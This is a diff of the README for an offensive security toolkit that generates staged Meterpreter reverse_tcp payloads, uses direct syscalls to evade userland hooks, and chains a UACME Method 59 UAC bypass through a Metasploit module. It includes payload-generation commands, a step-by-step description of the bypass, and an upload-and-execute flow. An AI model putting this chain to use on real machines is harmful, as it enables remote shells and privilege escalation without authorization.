@@ -14,6 +14,15 @@ Acheron Payload Toolkit is designed for security researchers to:
 - Test detection capabilities against staged Meterpreter payloads
 - Research Windows internals and privilege escalation paths
 
+## Overview
+
+Acheron Payload Toolkit combines:
+- **Acheron direct syscalls** (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) for userland API hooking evasion
+- **Staged Meterpreter payload** (`windows/x64/meterpreter/reverse_tcp`) - minimal shellcode (~511 bytes)
+- **Akagi (UACME) Method 59** for UAC bypass analysis via Debug Object / PPID Spoofing
+- **Interactive TUI** for payload generation and listener management
+- **Metasploit post-exploitation module** for automated UAC bypass chain
+
 ## Architecture
 
 ```
@@ -22,7 +31,7 @@ Acheron Payload Toolkit is designed for security researchers to:
 │                     │     │   (Windows)          │     │   Sessions      │
 │  • acherongen.sh    │     │  • C:\Temp\          │     │                 │
 │  • listener_gen.sh  │     │    akagi.exe         │     │  • Session 1    │
-│  • akagi.exe (UACME)│     │    payload.exe       │     │  • SYSTEM (2)   │
+│  • akagi.exe (UACME)│     │    payload.exe       │     │  • Elevated (2) │
 │  • Metasploit module│     │                      │     │                 │
 └─────────────────────┘     └──────────────────────┘     └─────────────────┘
 ```
@@ -31,14 +40,38 @@ Acheron Payload Toolkit is designed for security researchers to:
 
 | Component | Description |
 |-----------|-------------|
-| **Direct Syscalls** | Acheron library for `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` |
+| **Direct Syscalls** | Acheron library for `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` - bypasses userland API hooking |
 | **Staged Payload** | `windows/x64/meterpreter/reverse_tcp` (~511 bytes shellcode) |
 | **Acheron EXE** | PE32+ x64, ~1.8 MB, direct syscalls for evasion research |
 | **UAC Bypass Analysis** | Akagi (UACME) Method 59 - Debug Object / PPID Spoofing via AppInfo RPC |
-| **Automation** | Single Metasploit module executes complete analysis chain |
+| **Automation** | Single Metasploit module executes complete bypass chain |
 | **TUI Interface** | Interactive menu for payload generation and listener management |
 | **Meterpreter Upload** | Reliable file transfer via meterpreter `upload` command |
 | **Cross-compiled** | Built on Linux (Kali) for Windows x64 |
+
+## Evasion Capabilities & Limitations
+
+| Technique | What it evades | What it does NOT evade |
+|-----------|---------------|------------------------|
+| **Direct Syscalls** | Userland API hooking (some AV/EDR) | AMSI, ETW, memory scanning, behavioral analysis, network detection, file reputation, cloud lookup |
+| **Staged Meterpreter** | Small initial footprint | AMSI/EDR detection of staged payload in memory |
+
+> **Important**: This toolkit does **not** make payloads "FUD" (Fully Undetectable). Direct syscalls bypass only userland API hooks. Modern defenses (AMSI, ETW, behavioral analysis, memory scanning, EDR) can still detect and block the payload.
+
+## UAC Bypass Analysis (Method 59)
+
+**Technique**: Debug Object / PPID Spoofing via AppInfo RPC (James Forshaw / UACME)
+
+1. Launches `winver.exe` under debug via AppInfo RPC to steal Debug Object
+2. Launches `ComputerDefaults.exe` elevated under debug via AppInfo RPC
+3. Attaches as debugger, captures elevated process handle on first DLL load
+4. Duplicates handle with `PROCESS_ALL_ACCESS`
+5. Uses `CreateProcessFromParent` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to spoof PPID
+6. Executes payload as child of elevated process → runs with **High Integrity (Elevated Admin)**
+
+**Result**: Elevated Administrator token (High Integrity), **NOT** `NT AUTHORITY\SYSTEM`.
+
+> **Note**: Method 59 effectiveness varies by Windows version and patch level. Tested on specific builds only. May not work on all versions.
 
 ## Installation
 
@@ -66,8 +99,11 @@ Place `akagi.exe` (UACME compiled binary) at `$HOME/.local/share/acheron-toolkit
 **Compile Akagi on Windows (Visual Studio):**
 ```cmd
 # From UACME repo: https://github.com/hfiref0x/UACME
-# Open Source/Akagi/uacme.vcxproj in Visual Studio
-# Build Release x64 → akagi64.exe → rename to akagi.exe
+# Open Source/Akagi/uacme.vcxproj in Visual Studio 2019+
+# Configuration: Release x64
+# Runtime Library: Multi-threaded (/MT)
+# Additional Dependencies: ntdll.lib rpcrt4.lib advapi32.lib shlwapi.lib
+# Build → akagi64.exe → rename to akagi.exe
 # Copy to Kali: ~/.local/share/acheron-toolkit/bin/akagi.exe
 ```
 
@@ -84,10 +120,10 @@ acherongen.sh --help
 ```bash
 # Interactive TUI
 acheron
-# Select 1 → LHOST → LPORT → Template (1=None)
+# Select 1 → LHOST → LPORT
 
 # Direct command
-acherongen.sh 192.168.1.100 4444 none
+acherongen.sh 192.168.1.100 4444
 # Output: acheron_192.168.1.100_4444.exe (1.8 MB, PE32+ x64)
 ```
 
@@ -116,7 +152,7 @@ run
 2. Renames with random name
 3. Uploads `akagi.exe` + payload to `C:\Temp`
 4. Executes `akagi.exe 59 C:\Temp\payload.exe` (Method 59)
-5. Opens SYSTEM session for analysis
+5. Opens **Elevated Administrator** session for analysis
 
 ### 4. Check Dependencies
 ```bash
@@ -139,24 +175,6 @@ acheron-toolkit/
 ├── LICENSE
 └── .gitignore
 ```
-
-## UAC Bypass Details (Method 59)
-
-**Technique**: Debug Object / PPID Spoofing via AppInfo RPC (James Forshaw / UACME)
-
-1. Launches `winver.exe` under debug via AppInfo RPC to steal Debug Object
-2. Launches `ComputerDefaults.exe` elevated under debug via AppInfo RPC
-3. Attaches as debugger, captures elevated process handle on first DLL load
-4. Duplicates handle with `PROCESS_ALL_ACCESS`
-5. Uses `CreateProcessFromParent` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to spoof PPID
-6. Executes payload as child of elevated process → runs as SYSTEM
-
-**Requirements on target:**
-- Windows 7/8/10/11 (x64)
-- `C:\Temp` writable (default)
-- `akagi.exe` + payload in same directory
-
-**Note**: Method 59 effectiveness varies by Windows version and patch level. Tested on specific builds only.
 
 ## Building from Source
 
@@ -203,7 +221,7 @@ Trigger on push/PR.
 | Module not found | `reload_all` in msfconsole |
 | Akagi not found | Set `AKAGI_PATH` option or place at default location |
 | Session dies | Check `ExitOnSession false` in listener |
-| No SYSTEM session | Verify `akagi.exe` on target, check patch level, Method 59 may not work on all versions |
+| No elevated session | Verify `akagi.exe` on target, check patch level, Method 59 may not work on all versions |
 
 ## Security Notes
 
@@ -212,6 +230,7 @@ Trigger on push/PR.
 - **UAC bypass** - Requires `akagi.exe` on target (`C:\Temp\akagi.exe`)
 - **Listener persistence** - `ExitOnSession false` keeps handler alive
 - **Method 59 limitations** - May not work on all Windows versions/patch levels
+- **Result is Elevated Admin (High Integrity), NOT SYSTEM**
 
 ## License
 
@@ -229,4 +248,4 @@ This tool is for **authorized security testing and research only**. Unauthorized
 
 ---
 
-*Acheron Payload Research Toolkit v1.0*
+*Acheron Payload Research Toolkit v1.2*
